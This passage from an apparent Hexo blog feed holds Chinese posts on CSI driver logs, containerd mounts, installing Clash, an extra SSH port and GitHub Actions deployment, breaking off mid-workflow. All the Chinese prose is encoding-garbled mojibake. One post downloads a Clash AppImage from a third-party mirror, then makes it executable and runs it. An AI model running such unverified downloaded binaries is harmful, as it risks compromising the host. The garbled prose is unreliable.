class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> localpv[<span class="hljs-number">2443179</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">066717</span> <span class="hljs-number">2443179</span> grpc.go:<span class="hljs-number">72</span>] GRPC call: /csi.v1.Node/NodeGetInfo requests &#123;&#125;<br><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> localpv[<span class="hljs-number">2443179</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">073840</span> <span class="hljs-number">2443179</span> grpc.go:<span class="hljs-number">81</span>] GRPC response: &#123;<span class="hljs-string">&quot;accessible_topology&quot;</span>:&#123;<span class="hljs-string">&quot;segments&quot;</span>:&#123;<span class="hljs-string">&quot;openebs.io/nodename&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;node_id&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>node-driver-registrarè¿›ç¨‹çš„æ—¥å¿—ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> node-driver-registrar[<span class="hljs-number">2447943</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">064271</span> <span class="hljs-number">2447943</span> main.go:<span class="hljs-number">98</span>] <span class="hljs-string">&quot;Received GetInfo call&quot;</span> request=<span class="hljs-string">&quot;&amp;InfoRequest&#123;&#125;&quot;</span><br><span class="hljs-attribute">6</span>æœˆ <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> node-driver-registrar[<span class="hljs-number">2447943</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">116255</span> <span class="hljs-number">2447943</span> main.go:<span class="hljs-number">110</span>] <span class="hljs-string">&quot;Received NotifyRegistrationStatus call&quot;</span> status=<span class="hljs-string">&quot;&amp;RegistrationStatus&#123;PluginRegistered:true,Error:,&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>csinodeä¸Šçš„ä¿¡æ¯æœ‰äº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">CSINode</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>  <span class="hljs-attr">ownerReferences:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">uid:</span> <span class="hljs-string">c7a8993b-40ab-4641-849f-6ac40d8a6750</span><br>  <span class="hljs-attr">resourceVersion:</span> <span class="hljs-string">&quot;33527&quot;</span><br>  <span class="hljs-attr">uid:</span> <span class="hljs-string">7ac73448-c503-40b6-bed4-90a3285619da</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">drivers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">&lt;driverName&gt;</span><br>    <span class="hljs-attr">nodeID:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">topologyKeys:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">openebs.io/nodename</span><br></code></pre></td></tr></table></figure><p>nodeçš„annotationä¿¡æ¯ä¹Ÿæœ‰äº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">csi.volume.kubernetes.io/nodeid:</span> <span class="hljs-string">&#x27;&#123;&quot;&lt;driverName&gt;&quot;:&quot;node0&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202411) 09.å¦‚ä½•æ‰¾åˆ°æŸä¸ªå®¹å™¨æ–‡ä»¶ç³»ç»Ÿåœ¨ä¸»æœºä¸Šçš„æ˜ å°„ï¼Ÿ</title>
    <link href="/2024/11/22/containerd/%E3%80%90containerd%E3%80%91(202411)%2009.%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E6%9F%90%E4%B8%AA%E5%AE%B9%E5%99%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%9C%A8%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E6%98%A0%E5%B0%84%EF%BC%9F/"/>
    <url>/2024/11/22/containerd/%E3%80%90containerd%E3%80%91(202411)%2009.%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E6%9F%90%E4%B8%AA%E5%AE%B9%E5%99%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%9C%A8%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E6%98%A0%E5%B0%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">crictl <span class="hljs-keyword">ps</span> æ‰¾åˆ°ç¬¬ä¸€åˆ—çš„æŸä¸€ä¸ªcontainerID<br>mount |<span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;containerID&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241122121642.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241122121256.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241122121326.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘(202411) linuxä¸‹éƒ¨ç½²clash</title>
    <link href="/2024/11/20/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202411)%20linux%E4%B8%8B%E9%83%A8%E7%BD%B2clash/"/>
    <url>/2024/11/20/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202411)%20linux%E4%B8%8B%E9%83%A8%E7%BD%B2clash/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@ubuntu-22</span> ~]# uname -a<br>Linux ubuntu<span class="hljs-number">-22</span> <span class="hljs-number">6.8</span>.<span class="hljs-number">0</span><span class="hljs-number">-48</span>-generic <span class="hljs-variable">#48</span>~<span class="hljs-number">22.04</span>.<span class="hljs-number">1</span>-Ubuntu SMP PREEMPT_DYNAMIC Mon Oct  <span class="hljs-number">7</span> <span class="hljs-number">11</span>:<span class="hljs-number">24</span>:<span class="hljs-number">13</span> UTC <span class="hljs-number">2</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br></code></pre></td></tr></table></figure><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://clashcn.com/clashreleases">Clash Releases-Clashä¸­æ–‡ç½‘</a></p><h2 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241120235817.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ningan@ubuntu-22:~$ <span class="hljs-built_in">mkdir</span> clash<br>ningan@ubuntu-22:~$ <span class="hljs-built_in">cd</span> clash/<br><br><span class="hljs-comment"># ä¸‹è½½</span><br>ningan@ubuntu-22:~/clash$ wget https://down.clashcn.com/soft/CVR/clashcn.com_clash-verge_1.5.11_amd64.AppImage<br>--2024-11-20 23:37:45--  https://down.clashcn.com/soft/CVR/clashcn.com_clash-verge_1.5.11_amd64.AppImage<br><br><span class="hljs-comment"># èµ‹æƒ</span><br>ningan@ubuntu-22:~/clash$ <span class="hljs-built_in">chmod</span> 755 clashcn.com_clash-verge_1.5.11_amd64.AppImage <br><br><span class="hljs-comment"># æ‰§è¡Œ</span><br><span class="hljs-comment"># æ‰§è¡Œåä¼šç›´æ¥å¼¹å‡ºä¸€ä¸ªæ¡†</span><br>ningan@ubuntu-22:~/clash$ ./clashcn.com_clash-verge_1.5.11_amd64.AppImage <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241120235943.png" alt="image.png"></p><p>å…¶å®åˆ°è¿™ï¼Œå…¶å®å·²ç»å®‰è£…å¥½äº†</p><h1 id="é€‚é…ä¹‹å‰çš„é…ç½®"><a href="#é€‚é…ä¹‹å‰çš„é…ç½®" class="headerlink" title="é€‚é…ä¹‹å‰çš„é…ç½®"></a>é€‚é…ä¹‹å‰çš„é…ç½®</h1><p>ä¸ºäº†é€‚é…ä¹‹å‰çš„clashé»˜è®¤ç«¯å£ï¼Œå°†ä¸‹é¢è¿™ä¸ªåœ°æ–¹çš„ç«¯å£æ”¹ä¸º7890</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241121000147.png" alt="image.png"></p><p>ç›®å‰åªèƒ½çœ‹åˆ°7890ç«¯å£åœ¨127.0.0.1ä¸Šé¢</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@ubuntu</span><span class="hljs-number">-22</span> ~]<span class="hljs-comment"># netstat -nltp |grep 7890</span><br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">7890</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:*</span>               <span class="hljs-title class_">LISTEN</span>      <span class="hljs-number">124491</span>/clash-meta <br></code></pre></td></tr></table></figure><p>å°†ä¸‹é¢çš„å±€åŸŸç½‘è¿æ¥å¼€å¯ï¼Œå°±å¯ä»¥åœ¨æ‰€æœ‰ç½‘å¡ä¸Šçœ‹åˆ°7890ç«¯å£äº†</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241121000317.png" alt="image.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@ubuntu</span><span class="hljs-number">-22</span> ~]<span class="hljs-comment"># netstat -nltp |grep 7890</span><br>tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::<span class="hljs-symbol">:</span><span class="hljs-number">7890</span>                 ::<span class="hljs-symbol">:*</span>                    <span class="hljs-title class_">LISTEN</span>      <span class="hljs-number">126325</span>/clash-meta <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202411) sshåŠ 22000ç«¯å£</title>
    <link href="/2024/11/11/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202411)%20ssh%E5%8A%A022000%E7%AB%AF%E5%8F%A3/"/>
    <url>/2024/11/11/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202411)%20ssh%E5%8A%A022000%E7%AB%AF%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸‹é¢çš„æ–‡ä»¶ä¸­æ·»åŠ 22000ç«¯å£ï¼Œç„¶åé‡å¯sshdæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># cat /etc/ssh/sshd_config |grep 22</span><br><span class="hljs-comment">#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $</span><br>Port 22<br>Port 22000<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€hexoç³»åˆ—ã€‘03.Github Actionè‡ªåŠ¨éƒ¨ç½²hexo</title>
    <link href="/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9103.Github%20Action%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2hexo/"/>
    <url>/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9103.Github%20Action%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰æƒ…æè¦"><a href="#å‰æƒ…æè¦" class="headerlink" title="å‰æƒ…æè¦"></a>å‰æƒ…æè¦</h1><p><a href="https://ningan123.github.io/2022/12/10/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9101.hexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8Agithub.io%E6%90%AD%E5%BB%BA/#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">ã€hexoç³»åˆ—ã€‘01.hexoç¯å¢ƒæ­å»ºåŠgithub.ioæ­å»º - ningan123</a><br><a href="https://ningan123.github.io/2022/12/11/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9102.hexo%E5%92%8Cobsidian%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0%E4%B8%9D%E6%BB%91/">ã€hexoç³»åˆ—ã€‘02.hexoå’Œobsidianå®ç°ç¬”è®°ä¸æ»‘ - ningan123</a></p><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><p>1.åœ¨ä¸Šè¿°å®ç°çš„åŸºç¡€ä¸Šï¼Œæ¯æ¬¡åœ¨æœ¬åœ°æ›´æ–°å®Œç¬”è®°ä¹‹åï¼Œéœ€è¦æ‰‹åŠ¨æ‰§è¡Œ<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>æ¨é€åˆ°<code>github.io</code>ç½‘ç«™ï¼ˆGithub Pagesï¼‰ã€‚<br>2.æ¨é€è¿‡å»ä¹‹åè®¿é—®<code>ningan123.github.io</code>çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½é©¬ä¸Šçœ‹åˆ°æ›´æ–°çš„å†…å®¹ã€‚</p><h1 id="Github-Actionsä»‹ç»"><a href="#Github-Actionsä»‹ç»" class="headerlink" title="Github Actionsä»‹ç»"></a>Github Actionsä»‹ç»</h1><p>GitHub Actions æ˜¯ GitHub æ¨å‡ºçš„ä¸€é¡¹å¼ºå¤§çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨ GitHub ä»“åº“ä¸­åˆ›å»ºã€ç¼–è¾‘å’Œè¿è¡Œè‡ªåŠ¨åŒ–è„šæœ¬ï¼Œè¿™äº›è„šæœ¬è¢«ç§°ä¸ºå·¥ä½œæµç¨‹ï¼ˆworkflowsï¼‰ã€‚è¿™äº›å·¥ä½œæµç¨‹å¯ä»¥å“åº” GitHub ä¸Šçš„å„ç§äº‹ä»¶ï¼Œä¾‹å¦‚ä»£ç è¢«æ¨é€ã€issue è¢«åˆ›å»ºã€pull request è¢«æ‰“å¼€æˆ–å®šæœŸè°ƒåº¦ä»»åŠ¡ç­‰ã€‚</p><p>GitHub Actions çš„å·¥ä½œæµç¨‹ï¼ˆworkflowï¼‰ç”± YAML æ–‡ä»¶å®šä¹‰ï¼Œè¿™äº›æ–‡ä»¶æ”¾åœ¨ä»“åº“çš„Â <code>.github/workflows</code>Â ç›®å½•ä¸‹ã€‚æ¯ä¸ªå·¥ä½œæµç¨‹æ–‡ä»¶æè¿°äº†ä¸€ç³»åˆ—çš„ä½œä¸šï¼ˆjobsï¼‰å’Œæ­¥éª¤ï¼ˆstepsï¼‰ï¼Œå®šä¹‰äº†è¿è¡Œç¯å¢ƒã€è§¦å‘æ¡ä»¶ã€è¦æ‰§è¡Œçš„ä»»åŠ¡ç­‰ã€‚</p><h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>æœ¬åœ°å­˜åœ¨ä¸€ä¸ªå­˜æ”¾hexoåšå®¢çš„æ–‡ä»¶å¤¹<br>github.ioå·²ç»æ­å»º</p><h1 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h1><h2 id="1-æ–°å»ºç§æœ‰ä»“åº“ï¼ˆè‡ªåŠ¨åŒ–ä»“åº“ï¼‰"><a href="#1-æ–°å»ºç§æœ‰ä»“åº“ï¼ˆè‡ªåŠ¨åŒ–ä»“åº“ï¼‰" class="headerlink" title="1. æ–°å»ºç§æœ‰ä»“åº“ï¼ˆè‡ªåŠ¨åŒ–ä»“åº“ï¼‰"></a>1. æ–°å»ºç§æœ‰ä»“åº“ï¼ˆè‡ªåŠ¨åŒ–ä»“åº“ï¼‰</h2><p>å…ˆå»ºä¸€ä¸ªç§æœ‰ä»“åº“ï¼ˆblogï¼‰ï¼Œè¿™ä¸ªä»“åº“å­˜æ”¾çš„æ˜¯ç¼–è¯‘å‰çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä½ ç”µè„‘æœ¬åœ°çš„æ–‡ä»¶ï¼Œè¿™ä¸ªä»“åº“æ˜¯æ‹¿æ¥åšè‡ªåŠ¨åŒ–çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102133157.png" alt="image.png"></p><p><strong>ç›®å‰githubä¸Šä¸€å…±ä¸¤ä¸ªä»“åº“</strong></p><ul><li>ä¸€ä¸ªå…¬æœ‰ä»“åº“å­˜ç¼–è¯‘å¥½çš„hexoï¼ˆpagesä»“åº“ï¼Œä»“åº“åæ˜¯<code>ningan123.github.io</code>ï¼‰</li><li>ä¸€ä¸ªç§æœ‰ä»“åº“å­˜<strong>æœ¬åœ°ç”µè„‘ç¼–è¯‘å‰</strong>çš„æ–‡ä»¶ï¼ˆè‡ªåŠ¨åŒ–ä»“åº“ï¼Œä»“åº“åæ˜¯<code>blog</code>ï¼‰</li></ul><h2 id="2-ç»‘å®šæœ¬åœ°æ–‡ä»¶å¤¹åˆ°githubçš„ç§æœ‰ä»“åº“blog"><a href="#2-ç»‘å®šæœ¬åœ°æ–‡ä»¶å¤¹åˆ°githubçš„ç§æœ‰ä»“åº“blog" class="headerlink" title="2.ç»‘å®šæœ¬åœ°æ–‡ä»¶å¤¹åˆ°githubçš„ç§æœ‰ä»“åº“blog"></a>2.ç»‘å®šæœ¬åœ°æ–‡ä»¶å¤¹åˆ°githubçš„ç§æœ‰ä»“åº“blog</h2><h3 id="å…ˆæŸ¥çœ‹æœ¬åœ°çš„æ–‡ä»¶å¤¹æ˜¯å¦å·²ç»è¢«gitç®¡ç†"><a href="#å…ˆæŸ¥çœ‹æœ¬åœ°çš„æ–‡ä»¶å¤¹æ˜¯å¦å·²ç»è¢«gitç®¡ç†" class="headerlink" title="å…ˆæŸ¥çœ‹æœ¬åœ°çš„æ–‡ä»¶å¤¹æ˜¯å¦å·²ç»è¢«gitç®¡ç†"></a>å…ˆæŸ¥çœ‹æœ¬åœ°çš„æ–‡ä»¶å¤¹æ˜¯å¦å·²ç»è¢«gitç®¡ç†</h3><p>æ–¹æ³•1ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS E:\SynologyDrive\blog&gt; git remote -v<br>fatal: not a git repository (or any of the parent directories): .git<br>PS E:\SynologyDrive\blog&gt; <br></code></pre></td></tr></table></figure><p>æ–¹æ³•2ï¼š<br>æŸ¥çœ‹æ–‡ä»¶å¤¹æ ¹ç›®å½•ä¸‹æ˜¯å¦æœ‰.gitæ–‡ä»¶å¤¹ï¼Œå¦‚æœæœ‰ï¼Œéœ€è¦åˆ é™¤</p><h3 id="æ–‡ä»¶å¤¹æ ¹ç›®å½•ä¸‹æ·»åŠ -gitignoreæ–‡ä»¶"><a href="#æ–‡ä»¶å¤¹æ ¹ç›®å½•ä¸‹æ·»åŠ -gitignoreæ–‡ä»¶" class="headerlink" title="æ–‡ä»¶å¤¹æ ¹ç›®å½•ä¸‹æ·»åŠ .gitignoreæ–‡ä»¶"></a>æ–‡ä»¶å¤¹æ ¹ç›®å½•ä¸‹æ·»åŠ <code>.gitignore</code>æ–‡ä»¶</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">.DS_Store<br>Thumbs.db<br>db.json<br>*.log<br>node_modules/<br><span class="hljs-keyword">public</span>/<br>.deploy*/<br>.deploy_git*/<br>.idea<br>themes<span class="hljs-regexp">/butterfly/</span>.git<br>themes<span class="hljs-regexp">/3-hexo/</span>.git<br>themes<span class="hljs-regexp">/landscape/</span>.git<br>themes<span class="hljs-regexp">/fluid/</span>.git<br></code></pre></td></tr></table></figure><p>å¦‚æœä½ çš„ä¸»é¢˜ä¸æ˜¯butterflyï¼Œé‚£ä¹ˆæœ€åä¸€è¡Œè¯·æ”¹ä¸ºä½ ä½¿ç”¨çš„ä¸»é¢˜<br>æˆ‘æŠŠæˆ‘æ¶‰åŠåˆ°çš„å‡ ä¸ªä¸»é¢˜éƒ½å†™ä¸Šäº†</p><h3 id="ç»‘å®š"><a href="#ç»‘å®š" class="headerlink" title="ç»‘å®š"></a>ç»‘å®š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">git init  <span class="hljs-comment">#æŠŠè¿™ä¸ªç›®å½•å˜æˆGitå¯ä»¥ç®¡ç†çš„ä»“åº“</span><br><br><span class="hljs-comment"># å¯é€‰ begin</span><br><span class="hljs-comment"># è®¾ç½®æœ¬ä»“åº“çš„ç”¨æˆ·åå’Œé‚®ç®±</span><br>git config user.name ningan123<br>git config user.email xxx<br><span class="hljs-comment"># å¯é€‰ end</span><br><br>git add .   <span class="hljs-comment">#æ·»åŠ å½“å‰ç›®å½•æ–‡ä»¶åˆ°ç¼“å­˜åŒºï¼ˆåˆ«æ¼å‘½ä»¤åé¢çš„ç‚¹ï¼‰</span><br>git commit -m <span class="hljs-string">&quot;first commit&quot;</span>  <span class="hljs-comment">#æäº¤ç¼“å­˜åŒºå†…å®¹åˆ°æœ¬åœ°åº“ï¼Œå¹¶å¤‡æ³¨first commit</span><br><br><span class="hljs-comment">#ä¸‹é¢ä¸¤æ¡å‘½ä»¤äºŒé€‰ä¸€ï¼Œå°±è¡Œäº†</span><br>git remote add origin https://github.com/ç”¨æˆ·å/è‡ªåŠ¨åŒ–ä»“åº“å.git   <span class="hljs-comment">#åˆ©ç”¨httpså…³è”è¿œç¨‹ä»“åº“</span><br>git remote add origin git@github.com:ç”¨æˆ·å/è‡ªåŠ¨åŒ–ä»“åº“å.git   <span class="hljs-comment">#åˆ©ç”¨sshå…³è”è¿œç¨‹ä»“åº“</span><br><br>git remote add origin git@github.com:ningan123/blog.git<br><br>git push -u origin master  <span class="hljs-comment">#æŠŠæœ¬åœ°åº“çš„æ‰€æœ‰å†…å®¹æ¨é€åˆ°è¿œç¨‹åº“ä¸Š</span><br>git branch --set-upstream-to=origin/master master<br>git pull  <span class="hljs-comment"># å¦‚æœæŠ¥é”™ï¼Œfatal: refusing to merge unrelated historiesï¼Œæ‰§è¡Œï¼šgit pull --allow-unrelated-histories</span><br><br></code></pre></td></tr></table></figure><h2 id="3-è·å–-Github-token"><a href="#3-è·å–-Github-token" class="headerlink" title="3.è·å– Github token"></a>3.è·å– Github token</h2><p><a href="https://github.com/settings/tokens">Personal Access Tokens (Classic)</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102141503.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102141550.png" alt="image.png"></p><p>ç”Ÿæˆçš„tokenä¿å­˜å¥½ï¼Œåªä¼šå‡ºç°è¿™ä¸€æ¬¡ï¼Œæˆ‘ä¹‹å‰å·²ç»ç”Ÿæˆè¿‡äº†ï¼Œå°±ä¸ç”Ÿæˆäº†</p><h2 id="4-è®¾ç½®ç§æœ‰ä»“åº“çš„secret"><a href="#4-è®¾ç½®ç§æœ‰ä»“åº“çš„secret" class="headerlink" title="4.è®¾ç½®ç§æœ‰ä»“åº“çš„secret"></a>4.è®¾ç½®ç§æœ‰ä»“åº“çš„secret</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102141922.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102142203.png" alt="image.png"></p><h2 id="5-è®¾ç½®workflow"><a href="#5-è®¾ç½®workflow" class="headerlink" title="5.è®¾ç½®workflow"></a>5.è®¾ç½®workflow</h2><p>åœ¨æœ¬åœ°åšå®¢æ–‡ä»¶å¤¹.github&#x2F;workflows&#x2F;ä¸‹æ–°å»ºautodeploy.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 